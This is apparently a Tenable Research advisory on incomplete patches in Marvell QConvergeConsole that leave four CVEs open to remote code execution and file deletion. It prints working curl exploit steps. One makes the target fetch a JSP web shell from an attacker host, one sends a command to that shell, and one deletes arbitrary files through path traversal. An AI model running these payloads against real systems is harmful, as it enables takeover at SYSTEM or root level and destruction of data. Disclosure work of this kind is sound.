# Marvell QConvergeConsole GUI Multiple Vulnerabilities

High

[← View More Research Advisories](/security/research)
### Synopsis

Tenable Research discovered multiple vulnerabilities in Marvell QConvergeConsole GUI resulting from incomplete patches for previously published and patched vulnerabilities.

 **CVE-2020-15643: saveAsText Directory Traversal Remote Code Execution Vulnerability**
 The previous fix for this vulnerability only checks the name parameter for path traversal; it does not check the `prePath` parameter.
 If an authenticated, remote attacker specifies `prePath="QCCAgentInstallers"`, `name="webshell.jsp"` and `data=<contents_of_the_webshell_jsp_file>`, the **saveAsText** method will create a malicious web shell in the context path of the QCCAgentInstallers web application, which does not require authentication.
 The attacker can then send a command to the JSP web shell, which is running under the security context of the SYSTEM or root account.

See the Proof of Concept [here on GitHub](https://github.com/tenable/poc/blob/master/marvell/qconvergeconsole/marvell_qcc_gwttestservice_post_auth_rce.py).

 **CVE-2020-15644: setAppFileBytes Directory Traversal Remote Code Execution Vulnerability**
 The previous fix for this vulnerability only checks the name parameter for path traversal; it does not check the prePath parameter.
 If an authenticated, remote attacker specifies `prePath="QCCAgentInstallers"`, `name="webshell.jsp"`, `iType=4`, `data=<contents_of_the_webshell_jsp_file>`, and `iMode=1`, the **setAppFileBytes** method will create a malicious web shell in the context path of the QCCAgentInstallers web application, which does not require authentication.
 The attacker can then send a command to the JSP web shell, which is running under the security context of the SYSTEM or root account.

See the Proof of Concept [here on GitHub.](https://github.com/tenable/poc/blob/master/marvell/qconvergeconsole/marvell_qcc_gwttestservice_post_auth_rce.py)

 **CVE-2020-15645: getFileFromURL Unrestricted File Upload Remote Code Execution Vulnerability**
 The previous fix appears to have a logic error. Its intention looks to be to restrict the file download URL to download.qlogic.com, but it instead does the opposite (restricting download URLs containing download.qlogic.com).

```
public synchronized String getFileFromURL(String urlString, boolean bIsWarFile) {
    if (urlString.contains("download.qlogic.com")) {
      Trace.warn("getFileFromURL:  suspecious URL name, skipping operation.");
      return "";
  [...]
```

An authenticated, remote attacker can upload a malicious JSP file and execute it as SYSTEM or root.

```
# 1) Craft a JSP webshell
# 2) Run an httpd on the attacker host to serve the JSP webshell
root@host:/tmp# python3 -m http.server 8000 &
[1] 3477
root@host:/tmp# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

# 3) Instruct the QCC host to download the JSP webshell from attacker's host
# The JSP webshell will be saved in the context path of the QConvergeConsole web application
root@host:/tmp# curl -si  --cookie 'JSESSIONID=<valid_authenticated_JSESSIONID>' -H 'Content-Type: text/x-gwt-rpc; charset=UTF-8' -H 'X-GWT-Permutation: deadbeef' -d '7|0|7|http://<qcc_host>:8080/QConvergeConsole/com.qlogic.qms.hba.gwt.Main/|serialization_policy|com.qlogic.qms.hba.gwt.client.GWTTestService|getFileFromURL|java.lang.String/2004016611|Z|http://<attacker_host>:8000/webshell.jsp|1|2|3|4|2|5|6|7|0|' http://<qcc_host>:8080/QConvergeConsole/com.qlogic.qms.hba.gwt.Main/gwttestservice

# 4) Send a command to the JSP webshell
root@host:/tmp#  curl --cookie 'JSESSIONID=<valid_authenticated_JSESSIONID>'  http://<qcc_host>:8080/QConvergeConsole/webshell.jsp?cmd=whoami
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: whoami<BR>
nt authority\system

</pre>
</BODY></HTML>
```

**CVE-2020-5803: deleteAppFile Authenticated Path Traversal to File Deletion**

The deleteAppFile method of the GWTTestServiceImpl class lacks proper validation of a user-supplied path prior to using it in file deletion operations. An authenticated, remote attacker can leverage this vulnerability to delete arbitrary remote files as SYSTEM or root.

```
curl -si  --cookie 'JSESSIONID=<valid_authenticated_JSESSIONID>' \
-H 'Content-Type: text/x-gwt-rpc; charset=UTF-8' \
-H 'X-GWT-Permutation: deadbeef' \
-d '7|0|8|http://<qcc_host>:8080/QConvergeConsole/com.qlogic.qms.hba.gwt.Main/|serialization_policy|com.qlogic.qms.hba.gwt.client.GWTTestService|deleteAppFile|java.lang.String/2004016611|I||../../../../../../../../../<path_of_file_to_be_deleted>|1|2|3|4|3|5|5|6|7|8|8|' \
http://<qcc_host>:8080/QConvergeConsole/com.qlogic.qms.hba.gwt.Main/gwttestservice
```
